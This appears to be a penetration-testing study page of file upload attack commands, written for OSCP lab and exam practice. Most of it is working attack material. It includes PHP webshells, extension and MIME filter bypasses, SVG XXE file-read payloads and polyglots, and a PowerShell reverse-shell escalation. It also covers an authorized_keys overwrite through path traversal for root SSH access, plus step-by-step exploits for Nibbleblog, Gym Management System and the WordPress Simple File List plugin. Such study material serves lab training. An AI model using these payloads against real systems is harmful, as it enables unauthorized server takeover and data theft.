# File Upload Attacks, Command Appendix

Part of [[COMMAND APPENDIX]]. Getting an executable file past an upload filter, and what to do when the app won't ever execute what you upload at all.

---

## Webshell Creation

```bash
# Static command (for hostname/id checks)
cat << EOF > RCE.php
<?php system('hostname'); ?>
EOF

# Parameterised webshell ($REQUEST = GET + POST + cookie, more flexible than $GET alone)
cat << 'EOF' > RCE.php
<?php system($_REQUEST['cmd']); ?>
EOF

# Execute commands once uploaded
curl -s "http://$BoxIP/uploads/RCE.php?cmd=cat+/flag.txt"
```

## Nibbleblog 4.0.3 Authenticated Plugin Upload

After authenticating to Nibbleblog 4.0.3, the My Image plugin accepts a PHP file through its multipart configuration request. The vulnerable handler renames the upload to `image.php` under the plugin directory.

```bash
curl -s -b $CookieFile \
  -F 'plugin=my_image' -F 'title=My image' -F 'position=4' -F 'caption=' \
  -F 'image=@$PayloadFile;type=application/x-php' \
  -F 'image_resize=1' -F 'image_width=230' -F 'image_height=200' -F 'image_option=auto' \
  "http://$BoxIP/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image"
curl -s "http://$BoxIP/nibbleblog/content/private/plugins/my_image/image.php"
```

The first request uploads the file and the second request triggers it. The upload requires an authenticated session cookie. Source: [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|HTB Nibbles]].

## Filter Bypass Techniques

**Extension bypass ladder (try in order):**
```
1. Direct .php upload          → if no filter at all
2. Case-swap: .pHP, .PHP       → if blacklist only checks lowercase literal
3. Legacy extensions: .phar, .phps, .pht, .phtm, .phtml, .pgif, .php7
4. Double extension: shell.php.jpg     → .jpg satisfies whitelist; misconfigured Apache executes .php anywhere in name
5. Reverse double extension: shell.phar.jpg  → .phar passes blacklist, .jpg ends the name for whitelist
6. Content-Type bypass: change header to image/gif or image/svg+xml in Burp
7. MIME type (magic bytes): prepend GIF8 to file content — mime_content_type() returns image/gif
```

**`.phar` is the highest-value alternative extension**, it's a legitimate PHP Archive format the PHP interpreter executes, and blacklists that block `.php`/`.phps`/`.phtml` routinely miss it.

**Extension fuzzing via Burp Intruder** (when you need to enumerate the whole blacklist):
```
1. Capture upload request → send to Intruder (Ctrl+I)
2. Clear payload positions, set: filename="RCE§.php§" (markers around the extension)
3. Payload: paste PHP extensions list (see below), disable URL encoding
4. Start attack → sort by Length → different length = "File successfully uploaded" hit
```

**PHP extensions list for Intruder:**
```
.php .php2 .php3 .php4 .php5 .php6 .php7 .phps .pht .phtm .phtml .pgif .shtml .phar .inc .hphp .ctp .module
```
Full list also at `/usr/share/SecLists/Discovery/Web-Content/web-extensions.txt`.

**Case-swap:**
```
.pHP  .PHP  .Php
```

**Confirm code execution once a webshell lands:**
```bash
curl "http://$BoxIP/uploads/<shell>.phar?cmd=whoami"
# Uploaded files commonly land in /uploads/, /profile_images/, /user_feedback_submissions/, etc.
# Check the app's upload confirmation text for the exact path
```

**Windows reverse shell escalation via webshell** (base64 Unicode encoding for `-enc` flag):
```powershell
$Text = '<powershell reverse shell script>'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText = [Convert]::ToBase64String($Bytes)
```
```bash
nc -nvlp 4444
curl "http://$BoxIP/uploads/<shell>.pHP?cmd=powershell%20-enc%20<encoded_string_here>"
```
*`powershell -enc` expects UTF-16LE base64, not plain ASCII-then-base64.*

## Client-Side Bypass

**Method 1 — Burp intercept:**
1. Upload a real image, intercept the request in Burp
2. Change `filename="image.jpg"` → `filename="shell.php"`
3. Replace image bytes with `<?php system($_REQUEST['cmd']); ?>`
4. Forward request

**Method 2 — Browser DevTools:**
1. `Ctrl+Shift+C` → click the upload button/image area
2. In the `<form>` tag: change `onSubmit="return checkFile()"` → `onSubmit="upload()"`
3. In the `<input>` tag: remove `accept=".jpg,.jpeg,.png"` attribute
4. Upload a `.php` file normally, browser no longer restricts it

## Content-Type + MIME Bypass

```
# In Burp Repeater/Intercept:
# 1. Content-Type header: change to image/gif, image/jpeg, or image/svg+xml
# 2. File content: prepend GIF8 magic bytes (4 bytes, satisfies mime_content_type())
```

```
Content-Type: image/gif

GIF8
<?php system($_REQUEST['cmd']); ?>
```

**Content-Type fuzzing for allowed types:**
```bash
wget https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/web-all-content-types.txt
cat web-all-content-types.txt | grep 'image/' | xclip -se c   # paste into Intruder Payload Options
```
Set the Intruder position around `image/jpeg` in the Content-Type header. Responses that say "File successfully uploaded" (not "Only images are allowed") are accepted types.

## SVG XXE — File Read and PHP Source Disclosure

When the app only accepts SVG images, inject XXE to read server files:

**Arbitrary file read:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "/flag.txt"> ]>
<svg>&xxe;</svg>
```

**PHP source code read (php://filter via XXE):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```

```bash
# Save and upload:
cat << 'EOF' > shell.svg
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
EOF

# If the upload form doesn't accept .svg from the frontend:
mv shell.svg shell.jpeg
# Intercept in Burp → change filename="shell.svg" and Content-Type: image/svg+xml → forward
```

After upload, **view page source**, the file content appears inside the `<svg>` element. Decode base64:
```bash
echo 'BASE64BLOB' | base64 -d
```

**SVG+PHP polyglot** (SVG XML wrapper + PHP webshell in same file, used when SVG is allowed AND you need code execution):
```xml
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg> <?php system($_REQUEST['cmd']); ?>
```
The PHP interpreter ignores the XML before `<?php` and executes the webshell. Save as `.phar.svg` (or `.phar.jpeg` for frontend bypass → intercept to fix extension).

## Upload Date-Prefixed Filename Prediction

When `upload.php` source reveals `$fileName = date('ymd') . '_' . basename(...)`:
```bash
date +%y%m%d   # today's date prefix, e.g. 231130
# Full upload path: /contact/user_feedback_submissions/231130_shell.phar.svg
```

See [[09. Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]], [[09. Common Web Application Attacks|Common Web Application Attacks]] (all new techniques above), [[Beep|Beep box writeup]] (null-byte trick on upload).

#### Tags: #FileUpload #ExtensionFilterBypass #CaseSwapBypass #Phar #DoubleExtension #ContentTypeBypass #MIMEBypass #GIFMagicBytes #SVG #XXE #BurpIntruder #ClientSideBypass #PowerShellReverseShell

---

## When Nothing You Upload Will Ever Execute

Some upload mechanisms genuinely have no code-execution path at all (think a plain file-storage form). If the `filename` field itself is traversal-able, the fix is to combine the upload with Directory Traversal instead: overwrite a sensitive file elsewhere on disk rather than relying on the uploaded content being executed.

**Step 1: generate a keypair to plant**
```bash
ssh-keygen -f <keyname>          # -f skips the interactive path prompt
cat <keyname>.pub > authorized_keys
```

**Step 2: intercept the upload in Burp and rewrite the filename to a traversal path**
Enable Intercept, select `authorized_keys` in the upload form, submit, then in the caught request change the `filename` field to:
```
../../../../../../../root/.ssh/authorized_keys
```
Forward it.

**Step 3: connect with the planted key**
```bash
rm ~/.ssh/known_hosts            # needed if the hostname was reused from an earlier lab VM
ssh -p $Port -i <keyname> root@$BoxIP
```

*Worth checking before assuming this'll work: what happens if you upload the same filename twice? An "already exists" response can be abused to brute-force server file/directory names, and a differing error message can leak the backend language/framework. Also worth remembering: web apps built on a language's own bundled dev server (rather than deployed properly under Apache/Nginx/IIS) are frequently run as root/Administrator directly, always worth testing for this rather than assuming least-privilege.*

See [[09. Common Web Application Attacks#9.3.2. Using Non-Executable Files|9.3.2]] for the full worked walkthrough.

#### Tags: #UploadPlusTraversal #AuthorizedKeysOverwrite #SSHKeyPlanting #BurpFilenameRewrite

---

## Gym Management System 1.0 — unauthenticated double-extension upload

EDB-48506 abuses an upload handler that checks the final extension and
multipart MIME type but names the destination with the middle extension.

~~~bash
python2 $BoxDir/exploits/48506.py http://$BoxIP:$WebPort/
curl -s "http://$BoxIP:$WebPort/upload/kamehameha.php?telepathy=whoami"
~~~

The PoC submits:

- id=kamehameha
- filename=kaio-ken.php.png
- Content-Type=image/png
- pupload=upload
- PNG magic bytes followed by PHP code

The handler writes upload/kamehameha.php, which can be triggered with the
telepathy GET parameter. Confirm code execution before attempting a reverse
shell.

See [[RUNBOOK V2/Windows - Web - Gym Management Upload]] and
[[OSCP/BOXES/WRITE UPS/Windows/Buff|Buff]].

#### Tags: #GymManagement #EDB48506 #UnauthenticatedUpload #DoubleExtension #PHPWebshell

---

## WordPress Plugin Upload — Two-Step via Plugin Engine (CVE-2020-36847)

Simple File List <= 4.2.2. Unauthenticated upload requests can fail with HTTP 500 unless the plugin-specific POST fields are supplied.

**Step 1 — Create webshell:**
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.png
```

**Step 2 — Upload (all plugin fields required):**
```bash
curl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-upload-engine.php" \
  -F "file=@shell.png;type=image/png" \
  -F "eeSFL_ID=1" \
  -F "eeSFL_FileUploadDir=/wp-content/uploads/simple-file-list/" \
  -F "eeSFL_Timestamp=1587258885" \
  -F "eeSFL_Token=<token>"
# Token = plugin token used by the configured file list; it is visible on a page
# rendering the [simple-file-list] shortcode. Response: SUCCESS
```

**Step 3 — Verify upload landed:**
```bash
curl -s -o /dev/null -w "%{http_code}" \
  "http://$BoxIP/wp-content/uploads/simple-file-list/shell.png"
# 200 = file is there; 404 = upload failed, do not attempt rename
```

**Step 4 — Rename `.png` to `.php`:**
```bash
curl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-file-engine.php" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Referer: http://$BoxIP/wp-admin/admin.php?page=ee-simple-file-list&tab=file_list&eeListID=1" \
  -d "eeSFL_ID=1&eeFileOld=shell.png&eeListFolder=/&eeFileAction=Rename|shell.php"
# eeFileOld is the current filename (NOT oldFile/eeFilename/eeFile)
# Literal | in eeFileAction — not %7C
# eeSecurity nonce is NOT required on vulnerable 4.2.2 instances
```

**Step 5 — RCE:**
```bash
curl -s "http://$BoxIP/wp-content/uploads/simple-file-list/shell.php?cmd=id"
```

> Source: Nukem (PG Practice), [[WordPress - Simple File List Upload]]

#### Tags: #WordPress #SimpleFileList #FileUpload #RCE #CVE202036847

## **Outstanding**
This area grows alongside the modules. Whenever a new upload-bypass trick comes up (magic-byte/MIME spoofing, double extensions, polyglot files, etc), add it here with a link back to the source section.
## External Resources

- [HackTricks - Windows and Linux Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [RevShells](https://www.revshells.com/) for shell payload selection
- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
- [ippsec.rocks](https://ippsec.rocks/) for technique walkthrough searches
## Why this matters for OSCP

This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.

## Related Modules

- [[MODULES/09. Common Web Application Attacks]] -- module concepts used by this hub page

## Demonstrated in box write-ups

- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
